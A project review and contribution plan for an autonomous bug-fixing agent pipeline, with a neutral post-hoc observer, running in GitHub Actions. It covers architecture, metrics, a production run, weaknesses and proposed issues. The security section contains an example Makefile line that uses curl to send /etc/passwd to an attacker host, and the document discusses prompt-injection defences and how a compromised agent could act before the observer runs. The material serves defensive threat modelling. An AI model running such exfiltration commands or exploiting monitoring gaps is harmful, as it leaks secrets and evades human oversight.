# rl-bug-fix-full-send: Complete Review & fullsend Contribution Plan

**Date:** 2026-03-29
**Production run reviewed:** [GitHub Actions #27](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23720361026)
**Target repo:** [fullsend-ai/fullsend](https://github.com/fullsend-ai/fullsend)

---

## Part 1: Complete Review of rl-bug-fix-full-send

### What We Built

A **single-process phased pipeline engine** that autonomously fixes bugs in GitHub repositories. The engine runs in GitHub Actions and executes five phases in sequence: **triage → implement → review → validate → report**, with backtracking (review can reject back to implement) and a CI remediation sub-loop after PR creation.

A **neutral observer** job runs independently after the agent, reconstructing the execution from artifacts, cross-checking claims, generating attestations, and enforcing policy.

The engine was **built by an agentic loop itself** — 68 iterations of the "ralph loop" (Cursor agent CLI in a local loop) executing against an implementation plan, producing 2,983 tests across 49 test files, with all lint clean and 81/81 plan items complete.

### By the Numbers

| Metric | Value |
|--------|-------|
| Python source files | 106 |
| Lines of code (py + md + html + sh + yml) | ~61,500 |
| Engine modules (`engine/**/*.py`) | 53 |
| Test files | 49 |
| Test functions (`def test_`) | ~2,858 |
| Collected tests (with parametrize) | 2,983 |
| Prompt templates | 6 (triage, implement, review, validate, ci_remediate, report) |
| ADRs documented | 10 |
| Production runs completed | 14+ (meta-loop-runs directory) |
| LLM providers supported | 2 (Gemini, Anthropic) |
| CI workflow jobs | 2 (agent + observer) |

### Architecture

```
┌─────────────────────────────────────────┐
│ GitHub Actions Workflow (ralph-loop.yml) │
├────────────────┬────────────────────────┤
│  Agent Job     │  Observer Job          │
│  ┌──────────┐  │  ┌──────────────────┐  │
│  │ Triage   │  │  │ Reconstruct      │  │
│  │ Implement│  │  │ Cross-check      │  │
│  │ Review   │  │  │ Attest + Sign    │  │
│  │ Validate │  │  │ Policy Enforce   │  │
│  │ Report   │  │  │ PR Comment       │  │
│  └──────────┘  │  └──────────────────┘  │
│  ↓ CI Monitor  │                        │
│  ┌──────────┐  │                        │
│  │CI Remediate│ │                        │
│  └──────────┘  │                        │
└────────────────┴────────────────────────┘
```

Each phase subclasses `Phase` and implements an **OODA cycle** (observe → plan → act → validate → reflect). The loop (`RalphLoop`) manages phase transitions, backtracking on review rejection, escalation caps, exponential backoff, time budgets, and execution recording.

### The Good

**1. Documentation-driven development**
10 ADRs, a detailed SPEC, ARCHITECTURE.md, and IMPLEMENTATION-PLAN.md all explain *why* decisions were made, not just what was built. Every design choice (single-pipeline vs multi-agent, observer separation, dual-format output, CI-first testing) has a recorded rationale. This is rare for any project, exceptional for an agentic one.

**2. Security posture**
- Prompt injection test suite with payload catalogs
- Untrusted content delimiters as first-class concept in every prompt template
- Per-phase tool allowlists (triage can read but not write; implement can write but not push)
- Secrets redaction in tool execution layer
- Observer job runs in a separate security context with its own attestation and signing (Sigstore/cosign)
- Security audit tests asserting provenance and signing expectations

**3. Test depth and discipline**
2,983 tests covering: loop orchestration, phase OODA cycles, tool execution sandboxing, prompt injection defense, security audit, observer reconstruction/cross-checking/attestation/signing/policy, visualization plumbing, CI monitoring, and end-to-end scenarios with real git fixtures. The "golden principles" static checks enforce structural invariants across the codebase.

**4. Observability built in from the start**
Structured JSON logging, stderr narration, `progress.md` for human reading, `TranscriptWriter` for full LLM inference recording, `Tracer` for action timing, `LoopMetrics` for aggregate tracking, and `ExecutionRecord` as the source-of-truth artifact. Dual output format (JSON for machines, HTML for humans) is the right call.

**5. The meta-loop machinery actually works**
`meta-loop.sh` triggers CI, polls, downloads artifacts, analyzes results, runs the `meta_loop_agent.py` for auto-diagnosis, and loops. The git log shows real `meta-loop: auto-fix after run XXXXX` commits where the agent diagnosed production failures and patched the engine. This is a genuine feedback loop between local development and production execution.

**6. Production run #27 succeeded cleanly**
Single pass through all phases (no retries, no escalation), 4 LLM calls, ~29K tokens total, 3-minute wall clock. The fix (unique temp paths for parallel image processing in `fbc-fips-check-oci-ta`) was correct and the review caught a minor cleanup gap without blocking. This demonstrates the engine works end-to-end on a real bug.

### The Bad

**1. HTML report metric bugs undermine trust**
The landing page of `report.html` shows "Files Modified: 0" and "Tests Run: 0" while the narrative section describes actual file changes and a PR. "Total Time" shows "—" despite timestamps being available. For a report meant to give stakeholders confidence, **incorrect zero values are worse than no values**. This is the first thing someone sees and it erodes trust in everything below it.

**2. Workflow output wiring is incomplete**
The `ralph-loop.yml` declares `outputs.pr_number` and `outputs.repo` on the agent job, but the "Run Ralph Loop Engine" step only writes `status` to `$GITHUB_OUTPUT`. The observer job's "Post policy result to PR" step depends on `pr_number` being set — so it **never runs**, even on successful PR-producing runs. The observer attestation gets uploaded as an artifact but never reaches the PR as a comment.

**3. `RalphLoop` is a god object**
`engine/loop.py` handles: phase orchestration, backtracking, escalation, the CI monitoring sub-loop, CI remediation dispatch, PR detection, branch extraction, repo URL parsing, and execution recording. It works, but it's one refactor away from being unmanageable. The CI monitoring sub-loop in particular should be its own module.

**4. Duplicated constants are drift hazards**
`PHASE_ORDER` appears in both `engine/loop.py` and `engine/observer/cross_checker.py`. `ENGINE_FILES` in `meta_loop_agent.py` is a hardcoded list of engine source files that must be manually updated when new modules are added. These will silently go stale.

**5. All external APIs are mocked — no contract tests**
Gemini, Anthropic, and GitHub API interactions are all tested through mocks. There are no contract tests, API response schema validation, or integration tests against real (or sandboxed) services. The meta-loop catches production failures, but the feedback cycle is slow (trigger CI → wait → download → diagnose → patch → push → repeat).

**6. `shell_run` on target repos is an inherent RCE surface**
The implement phase can execute shell commands in the target repository. A malicious repository (or a crafted issue) could potentially trigger dangerous commands. The tool executor has path restrictions and redaction, but there's no formal sandbox (no container isolation, no seccomp, no namespace separation). The trust model currently assumes the target repo is benign.

**7. Observer is post-hoc, not preventive**
The observer runs *after* the agent job completes. If the agent is compromised (prompt injection, malicious repo content), the damage (bad push, secret exfiltration) happens during the agent job. The observer can detect inconsistency but cannot prevent it. This is documented in ADR-008 as a known limitation, but it's worth calling out as a real gap.

**8. Heuristic CI failure categorization**
CI failure classification uses keyword matching against ~50 frozen-set terms. Real-world CI output is messy — overlapping keywords, novel failure modes, infrastructure errors that look like test failures. The 91 tests use fixtures, but fixture diversity may not cover the long tail of real CI noise.

**9. `progress/status.json` has dual semantics**
Both `run-ralph-loop.sh` (writes `{"ralphComplete": true}`) and the report/progress generator (writes detailed execution summaries) use the same file path. This works because they run at different times, but it's confusing and fragile.

**10. No dependency pinning**
`pyproject.toml` lists `google-genai`, `anthropic`, `httpx`, `pyyaml`, `jinja2`, `rich` with no version constraints. A breaking change in any dependency will break the engine silently. For something running in CI, pinned dependencies (or at minimum lower bounds) are essential.

---

## Part 2: Production Run #27 Analysis

### Execution Summary

| Field | Value |
|-------|-------|
| Execution ID | `68e79770-cb14-4890-98a0-a449f7b6ad2f` |
| Issue | [nonflux/build-definitions#1](https://github.com/nonflux/build-definitions/issues/1) |
| Wall clock | ~3 minutes (22:15:10 → 22:18:12 UTC) |
| Outcome | **SUCCESS** — all phases passed, fix applied |
| LLM calls | 4 (one per substantive phase) |
| Total tokens | 29,008 (23,769 in / 5,239 out) |
| Tool executions | 18-22 (depending on counting granularity) |
| Model | gemini-2.5-pro |

### Phase Results

| Phase | Result | Duration | LLM Calls | Tool Calls |
|-------|--------|----------|-----------|------------|
| Triage | PASS | 26.4s | 1 | 5 |
| Implement | PASS | 107.8s | 1 | 5 |
| Review | PASS | 21.5s | 1 | 2 |
| Validate | PASS | 23.5s | 1 | 6 |
| Report | PASS | ~0.15s | 0 | 0 |

### What the Fix Did

The bug was an intermittent failure in `fbc-fips-check-oci-ta` (a Tekton StepAction) where parallel image processing used shared temp directories, causing race conditions (`lstat: no such file or directory`). The engine:

1. **Triage**: Identified the root cause as shared temp paths in parallel execution
2. **Implement**: Added per-image counters to make OCI/unpacked/report paths unique, updated `cleanup_image_artifacts` accordingly
3. **Review**: Approved with one nit (cleanup doesn't remove report CSV — pre-existing, not introduced)
4. **Validate**: Generated PR metadata, marked ready to submit

### Report Quality

**Strong**: Clear narrative, phase table, iteration timeline, LLM inference log with full request/response for audit, summary.md as a compact duplicate for GitHub Step Summary.

**Weak**: Landing metric cards show zeros for "Files Modified" and "Tests Run" despite actual changes being made. "Total Time" displays "—". These dashboard bugs are the most visible part of the report and they're wrong.

---

## Part 3: fullsend Contribution Plan

### Experiment: End-to-End Bug Fix Engine with Phased Pipeline and Neutral Observer

This is the primary deliverable — a write-up of what rl-bug-fix-full-send built and learned, formatted for `experiments/` in fullsend.

**Proposed file:** `experiments/005-bug-fix-engine-phased-pipeline.md`

```markdown
# Experiment 005: End-to-End Bug Fix Engine with Phased Pipeline and Neutral Observer

**Date:** 2026-03-29
**Status:** Completed
**Relates to:** intent-representation, security-threat-model, code-review,
  autonomy-spectrum, testing-agents, agent-architecture, repo-readiness

## Hypothesis

A single-process phased pipeline (triage → implement → review → validate → report)
with bounded backtracking, per-phase tool restrictions, and a post-hoc neutral observer
can autonomously produce correct, mergeable bug fixes for real GitHub issues — without
human intervention during execution — while providing sufficient observability and
attestation for human oversight after the fact.

Secondary hypothesis: the engine itself can be developed by an agentic loop (Cursor
agent CLI running against an implementation plan), with a meta-loop providing production
feedback to close the development cycle.

## Setup

### Engine architecture
- **Runtime:** Python 3.12, single-process, runs in GitHub Actions
- **Phases:** triage, implement, review, validate, report — each with OODA cycle
  (observe/plan/act/validate/reflect) and phase-specific tool allowlists
- **Backtracking:** Review can reject back to implement, bounded by escalation cap
- **CI remediation:** Post-PR sub-loop monitors CI, categorizes failures, auto-fixes or reruns
- **Observer:** Separate CI job — reconstructs execution, cross-checks claims, signs attestation
- **LLM providers:** Gemini 2.5 Pro (primary), Anthropic (fallback)
- **Target:** Cross-fork PRs (engine repo triggers workflow, pushes fix branch to fork, opens PR against upstream)

### Development methodology
- 68 iterations of "ralph loop" (Cursor agent CLI + implementation plan)
- Meta-loop for production: trigger workflow → monitor → download artifacts → analyze → auto-fix → push
- 14+ production runs against nonflux/build-definitions#1

### Scale
- 106 Python source files, ~61,500 lines total
- 53 engine modules, 49 test files, 2,983 tests
- 6 prompt templates, 10 ADRs, 3 output formats (JSON, HTML, Markdown)

## Results

### Production run (representative)
- **Issue:** Intermittent race condition in parallel Tekton StepAction (fbc-fips-check-oci-ta)
- **Outcome:** SUCCESS — correct fix in single pass, no retries, no escalation
- **Cost:** 4 LLM calls, 29K tokens, 3-minute wall clock
- **Fix quality:** Review approved with one minor nit (pre-existing cleanup gap, not introduced)

### What worked

1. **Phased pipeline with tool restrictions** — triage can't write, implement can't push,
   review is read-only. This enforces separation of concerns at the tool level, not just
   the prompt level. Phases can't accidentally do things outside their scope.

2. **Bounded backtracking** — Review rejection sends back to implement with findings
   context. Escalation cap prevents infinite loops. In practice, most fixes pass review
   on first or second attempt.

3. **Untrusted content handling** — Every prompt template wraps external content
   (issue text, file contents, CI logs) in explicit delimiters with instructions to
   treat it as data, not instructions. Prompt injection test suite validates this boundary.

4. **Structured output** — JSON execution record as source of truth, HTML report for
   humans, summary.md for GitHub Step Summary, transcripts for audit. The dual-format
   approach satisfies both automation and human review needs.

5. **Neutral observer** — Post-hoc reconstruction and cross-checking from artifacts
   provides an independent verification layer. Sigstore signing ties attestations to
   the CI identity, not a long-lived key.

6. **Meta-loop development** — The engine was built by an agentic loop and tested by a
   production feedback loop. The git log contains commits like "meta-loop: auto-fix
   after run XXXXX" where the agent diagnosed production failures and patched the engine.
   This validates the "agents building agent infrastructure" pattern.

### What didn't work (or needs work)

1. **Report metric bugs** — Landing page showed "Files Modified: 0" and "Tests Run: 0"
   despite actual changes. Dashboard credibility is critical for stakeholder trust and
   this was the most visible failure.

2. **Workflow output wiring** — The observer's PR comment step depends on `pr_number`
   being set as a job output, but the agent step never writes it. The observer runs and
   produces attestation artifacts, but can't post them to the PR.

3. **No local test execution** — The validate phase relies on target repo CI for
   correctness validation. The engine doesn't run the target repo's tests locally before
   pushing. For simple fixes this is fine; for complex changes it's risky.

4. **Heuristic CI categorization** — Keyword-based failure classification works for
   common patterns but will misclassify novel failures. No learning or adaptation.

5. **shell_run is an RCE surface** — The implement phase can execute arbitrary commands
   in the target repo. Mitigated by path restrictions and redaction but not by container
   isolation or seccomp. A malicious repo could exploit this.

6. **Observer is post-hoc** — Detects inconsistency but cannot prevent damage during
   the agent job. A compromised agent could push bad code before the observer runs.

## Learnings for fullsend

### For intent-representation
Bug fix intent is relatively easy to express (issue description + affected files), but
**scope control** is hard. The implement phase sometimes wants to fix adjacent issues
it discovers. The review phase must enforce "did you fix the bug described in the issue,
and only that bug?" Scope checking needs to be explicit in review criteria.

### For security-threat-model
The biggest real risk we encountered was not prompt injection (the delimiter approach
works well in practice) but **tool misuse** — the agent running commands in the target
repo that have unintended side effects. The second biggest risk is **stale mocks** — all
external APIs are mocked in tests, so a breaking API change won't be caught until
production. Contract tests or API schema validation would close this gap.

### For code-review
Self-review (the engine reviewing its own output) is weaker than it appears. The review
phase has access to the same context as implement, which means it shares the same blind
spots. The neutral observer provides a second perspective but only post-hoc. A stronger
architecture would have the review phase use a different model or different context window.

### For autonomy-spectrum
The engine's escalation logic (cap on review rejections, time budget, CI remediation
cap) works as a **fail-closed** mechanism — when the agent can't make progress, it stops
and reports rather than looping forever. This is the right default. The caps should be
configurable per-repo based on repo readiness signals.

### For testing-agents
2,983 tests sound impressive but they're all **structural/behavioral** — they test that
the engine does what the code says, not that the engine produces good fixes. The real
eval is the production run outcome, which requires a benchmark suite of known-good bug
fixes. The promptfoo-eval experiment in fullsend is closer to the right approach.

### For repo-readiness
Target repos without good CI give the engine nothing to validate against. The validate
phase becomes "does it compile?" which is a low bar. The engine implicitly requires
target repos to have CI that catches the class of bug being fixed. This should be a
documented prerequisite.

## Artifacts

- Repository: https://github.com/ascerra/rl-bug-fix-full-send
- Production run: https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23720361026
- HTML report: available as workflow artifact (ralph-loop-reports-*)
- Engine docs: ARCHITECTURE.md, SPEC.md, 10 ADRs in-repo
```

### Issues to File or Contribute To on fullsend-ai/fullsend

**Contribute to existing issues (comment with findings + link to experiment):**

**1. #68 — "Define the MVP bugfix workflow"**
rl-bug-fix-full-send IS an implemented MVP bugfix workflow. The issue asks for a `docs/mvp.md` describing the end-to-end flow. We can contribute concrete findings: the phase sequence (triage → implement → review → validate → report), per-phase tool restrictions, escalation logic, and production results demonstrating it works. This is empirical input for the document they want to write, not the document itself.

**2. #85 — "Experiment: implement-review agent loop with iterative feedback"**
This issue asks for an experiment validating the implement-review loop with structured feedback. We built exactly this: review returns findings with categories, implement receives them as context on retry, bounded by escalation cap. We can answer their open questions directly:
- Feedback format: structured JSON with verdict, findings array, severity, dimension
- Convergence: most fixes pass in 1-2 iterations; oscillation prevented by escalation cap
- Termination: reviewer approval OR max iterations (configurable), then escalation
- History: implementer sees previous attempt findings (not full history) to keep context lean
Our experiment is the result they're looking for. Comment with results and link to experiment doc.

**3. #86 — "Define triage agent fix scope strategy"**
Our triage phase defaults to narrow fix, but scope creep during implement was a real problem. The review phase enforces "did you fix only the stated bug?" as a check. This is data supporting the issue's "narrow fix + derivative issues" option. Comment with our experience: scope-checking in review works as a backstop but needs explicit criteria.

**4. #78 — "Choose and implement a sandbox layer for agent runs"**
This issue already covers fs isolation, network isolation, per-run configuration, and provenance recording in detail. Our concrete finding: `shell_run` in the implement phase is the highest-risk tool because it executes arbitrary commands in the target repo. Without container isolation the only protection is path restrictions in the tool executor. Comment with: what we implemented (path allowlists, redaction), what we didn't (container isolation, seccomp, network namespacing), and where it fell short. Do NOT file a duplicate sandbox issue.

**5. #102 — "Ensure that comments by agents can be trusted"**
This issue discusses GPG/SSH signing of agent-generated comments on issues/PRs. Our observer uses Sigstore/cosign signing of execution attestation artifacts — a different granularity (execution-level vs comment-level) but the same trust problem. Comment with: the attestation approach (in-toto payload, OIDC identity, Sigstore signing) and the finding that the observer's PR comment step never fires because `pr_number` isn't wired through workflow outputs. Also note that attestation signing and comment signing are complementary, not alternatives.

**New issues to file (verified these don't duplicate existing):**

**6. New issue: "Report/dashboard metric accuracy as a trust requirement"**
No existing issue covers this. Framing: agent autonomy requires human trust. Reports with incorrect zero values ("Files Modified: 0" when implement succeeded) actively erode that trust. The report is often the only artifact stakeholders see. Propose: metric validation in report generation (assert files_modified > 0 when implement phase succeeded), report regression tests with golden output, and treat dashboard bugs as high-severity. Links to autonomy-spectrum.md (trust signals) and human-factors.md (stakeholder confidence).

**7. New issue: "Contract tests for LLM and GitHub API integrations"**
No existing issue covers this. Framing: in rl-bug-fix-full-send, all external API interactions (Gemini, Anthropic, GitHub) are mocked in tests. Breaking API changes are invisible until production. The meta-loop catches failures but the feedback cycle is slow (trigger → wait → download → diagnose → patch → push ≈ 30+ minutes). Propose: lightweight contract test approach (recorded responses with schema validation, periodic live-API smoke tests in CI). Links to testing-agents.md (eval vs integration testing) and repo-readiness.md (CI maturity).

**8. New issue: "Observer timing gap — post-hoc attestation vs real-time prevention"**
No existing issue covers the observer timing problem specifically. #102 is about comment trust (signing); this is about the architectural gap where a post-hoc observer cannot prevent damage during the agent job. Framing: rl-bug-fix-full-send implements a neutral observer (separate CI job, artifact reconstruction, cross-checking, signed attestation) that runs *after* the agent completes. A compromised agent can push bad code, exfiltrate secrets, or modify the repo before the observer runs. Propose discussing architectures for real-time guardrails (tool-call approval gateway, sidecar observer, pre-push hook) alongside post-hoc attestation. Links to security-threat-model.md (agent drift, supply chain) and agent-architecture.md (agent authority boundaries).

### Problem Doc Contributions

**1. `testing-agents.md` — Add subsection under existing "Golden-set evaluation" or new subsection: "Empirical finding: structural tests vs outcome evals"**
The doc already has deep sections on golden-set evaluation (Approach 1) and behavioral contract testing (Approach 2). Our contribution adds empirical data, not a new approach: 2,983 structural tests verify the engine behaves as coded, but zero tests verify it produces *good* fixes. The real eval is the production run outcome. This maps to the doc's existing observation about "coverage question" — how do you know the golden set is sufficient? Our finding: you don't, and structural tests give false confidence. Propose adding: a subsection on the structural-vs-outcome gap with concrete numbers, and a reference to the promptfoo-eval experiment (004) as closer to the right approach for outcome eval. Also propose: benchmark suite of known-good bug fixes (issue + human fix + automated fix, scored on correctness/scope/side-effects) as a specific golden-set format for bug-fix agents.

**2. `security-threat-model.md` — Add subsection under Threat 1 or as new Threat 5: "Tool misuse via target repo content"**
The doc covers prompt injection (Threat 1) extensively, including steganographic/invisible Unicode attacks. Our finding adds a distinct vector: the agent executing shell commands derived from target repo content. This is NOT prompt injection — the agent's prompts are fine, but the agent reads a Makefile target, a CI script, or a file path containing shell metacharacters and executes them. The agent is following instructions correctly; the repo content is the weapon. A `Makefile` with `test: ; curl attacker.com/$(cat /etc/passwd)` would be executed faithfully by an implement phase running `make test`. This is closer to supply chain (Threat 4) than injection (Threat 1) but deserves its own subsection because the attack surface is different: it exploits the tool layer, not the LLM layer.

**3. `code-review.md` — Add subsection: "Empirical evidence for decomposition from monolithic review"**
The doc already makes a strong case for sub-agent decomposition (context window argument, defense-in-depth argument, specialization argument). Our contribution adds empirical evidence supporting their recommendation: rl-bug-fix-full-send uses a *single monolithic* review phase (the opposite of what code-review.md recommends). Concrete finding: self-review with one model and similar context shares blind spots with the implementation phase — review approved fixes that a human reviewer later found had scope creep. The review phase catches syntax, correctness, and obvious issues but misses higher-order concerns (scope drift, architectural fit). This directly validates the doc's defense-in-depth argument: a single reviewer is a single point of failure. The neutral observer partially compensates (post-hoc, different context) but is not a substitute for decomposed sub-agents during review.

### ADR to Propose

**ADR: Dual-loop development methodology for agent infrastructure**

The rl-bug-fix-full-send development used two loops:
1. **Inner loop (ralph loop):** Cursor agent CLI executing against an implementation plan, building the engine locally, running tests
2. **Outer loop (meta-loop):** Triggering the engine in CI against a real issue, downloading artifacts, analyzing results, auto-patching the engine, pushing, repeating

This is "agents building agent infrastructure with production feedback." It worked — 68 inner iterations and 14+ outer iterations produced a working engine. But it also has risks: the inner loop agent can introduce subtle bugs that only manifest in production, and the outer loop's auto-fix mode can commit patches without human review.

**Propose as Undecided** with options:
1. Dual-loop with human gates (current approach minus `--auto-push`)
2. Dual-loop fully autonomous (current approach with `--auto-push`)
3. Single-loop only (no agentic inner development, only production feedback)

Relates to: autonomy-spectrum, testing-agents, human-factors

---

## Summary

**What we proved:** A phased pipeline engine can autonomously produce correct bug fixes for real GitHub issues, with sufficient observability for post-hoc human oversight. The meta-loop development methodology (agents building agent infrastructure) is viable but needs guardrails.

**What we didn't prove:** That the engine produces good fixes consistently across diverse bug types, repos, and languages. One successful production run on one issue is a proof of concept, not a proof of reliability. A benchmark suite is the next step.

**For fullsend:** This experiment directly contributes to 5 existing issues (#68, #85, #86, #78, #102), adds 3 genuinely new issues (report accuracy, contract tests, observer timing gap), proposes 3 problem doc contributions with empirical evidence (testing-agents, security-threat-model, code-review), 1 experiment write-up, and 1 ADR proposal. All verified against existing fullsend content to avoid duplication.
